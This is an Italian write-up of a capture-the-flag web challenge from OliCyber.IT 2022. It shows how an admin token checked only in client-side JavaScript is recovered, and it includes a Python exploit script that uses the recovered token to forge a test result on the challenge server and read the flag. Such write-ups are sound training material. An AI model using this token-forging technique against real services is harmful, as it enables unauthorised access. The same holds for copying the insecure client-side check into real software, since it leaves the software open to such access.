# OliCyber.IT 2022 - Competizione territoriale

## [web-1] Flag Pass (153 risoluzioni)

La challenge si presenta come un sito in cui è possibile eseguire dei test.

Il risultato del test viene aggiornato automaticamente a `FAILED` dopo pochi secondi dalla creazione.

Per ottenere la flag bisogna riuscire ad effettuare un test e ottenere `PASSED` come risultato.

### Soluzione

Il sito offre anche un endpoint per inserire il risultato di un test, fornendo il token dell'admin.

Analizzando la pagina `/record_result` si può notare uno script con cui il token viene controllato lato client.

```javascript
if (t.charCodeAt(13) === (((-30420 / 13) / 30) + 123) &&
    t.charCodeAt(11) === (((((-33063 / 103) / 107) ^ 86) + 76) + 111) &&
    t.charCodeAt(29) === (((-251 ^ 141) + 64) + 105) &&
    t.charCodeAt(3) === (((((2052 ^ 87) ^ 111) / 68) ^ 91) - 12) &&
    t.charCodeAt(16) === ((((16 ^ 23) + 61) - 119) + 150) &&
    t.charCodeAt(2) === (((-1140 / 95) ^ 82) + 139) &&
    t.charCodeAt(6) === (((20266 - 26) / 115) - 123) &&
    t.charCodeAt(23) === ((((1218 - 57) + 2) ^ 52) / 27) &&
    t.charCodeAt(21) === ((((27 - 113) - 83) + 79) + 141) &&
    t.charCodeAt(14) === ((((((167 ^ 77) ^ 133) - 107) ^ 5) ^ 80) - 29) &&
    t.charCodeAt(27) === ((((((57812794 ^ 50) / 88) + 127) / 90) / 49) - 94) &&
    t.charCodeAt(7) === (((((8375612 / 28) - 139) / 145) + 5) / 39) &&
    t.charCodeAt(18) === ((((((-7664 ^ 69) + 3) - 24) / 56) ^ 133) + 48) &&
    t.charCodeAt(20) === (((((179 ^ 85) + 32) - 117) ^ 149) ^ 55) &&
    t.charCodeAt(25) === ((((((235 + 77) - 77) - 35) - 127) + 24) ^ 5) &&
    t.charCodeAt(24) === (((-14 + 60) ^ 65) - 14) &&
    t.charCodeAt(28) === (((236 - 140) ^ 135) ^ 129) &&
    t.charCodeAt(0) === (((29 ^ 93) / 8) + 48) &&
    t.charCodeAt(12) === (((((16654 ^ 78) ^ 145) / 83) + 25) ^ 130) &&
    t.charCodeAt(8) === ((((154 ^ 126) ^ 118) - 5) - 96) &&
    t.charCodeAt(32) === (((((7 ^ 143) - 112) + 59) - 68) + 38) &&
    t.charCodeAt(4) === (((((10817 + 112) - 120) - 81) / 149) + 28) &&
    t.charCodeAt(15) === ((((((262 ^ 116) ^ 140) ^ 117) - 105) - 133) - 59) &&
    t.charCodeAt(5) === ((((((13809800 / 145) / 10) + 137) ^ 143) / 138) ^ 118) &&
    t.charCodeAt(19) === ((((-428 ^ 83) / 101) + 100) ^ 102) &&
    t.charCodeAt(10) === ((((6720 + 28) + 16) / 76) - 33) &&
    t.charCodeAt(31) === (((15456 / 138) - 14) ^ 3) &&
    t.charCodeAt(17) === (((1657 - 59) + 136) / 34) &&
    t.charCodeAt(1) === ((((((-4323 ^ 53) / 56) + 21) + 43) + 41) + 22) &&
    t.charCodeAt(9) === ((((((34470 / 15) ^ 60) + 122) / 37) - 12) ^ 7) &&
    t.charCodeAt(35) === (((298 - 27) - 146) ^ 24) &&
    t.charCodeAt(26) === (((97 ^ 133) ^ 35) - 97) &&
    t.charCodeAt(33) === (((((12604 / 137) - 95) - 63) - 3) + 122) &&
    t.charCodeAt(34) === (((((342639 / 33) + 121) ^ 3) / 133) ^ 45) &&
    t.charCodeAt(22) === ((((((132974976 / 128) - 3) - 53) + 149) / 148) / 130) &&
    t.charCodeAt(30) === ((((((2319989 + 11) / 80) / 145) ^ 114) ^ 94) ^ 134)) {

    // token ok
    ...
}
```

Il controllo viene effettuato su ogni carattere del token, confrontando il codice del carattere con il risultato di un'operazione.

É possibile ricostruire il token, carattere per carattere, eseguendo le operazioni effettuate nel controllo.

Il token ricostruito è `8218d355-38ff-4bc3-9336-adf7f1ba55be` e può essere usato per modificare il risultato di un test.

La flag si trova nel qrcode generato per un test con risultato `PASSED`.

### Exploit

```python
import requests
import re
import PIL.Image
import base64
import io
from pyzbar.pyzbar import decode

host = "http://flag-pass.challs.olicyber.it"

secret_token = "8218d355-38ff-4bc3-9336-adf7f1ba55be"

r = requests.get(host + "/test")
test_id = re.search(
    r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}", r.text
)[0]


r = requests.post(
    host + "/record_result",
    json={"token": secret_token, "test_id": test_id, "result": True},
)

assert r.status_code == 200

r = requests.get(host + "/pass", params={"id": test_id})

x = re.search(r"base64,([\w/+=]+)\"", r.text)[1]

img = PIL.Image.open(io.BytesIO(base64.b64decode(x)))

decoded = decode(img)

flag = re.search(r"flag{.+}", decoded[0].data.decode())[0]

print(flag)
```
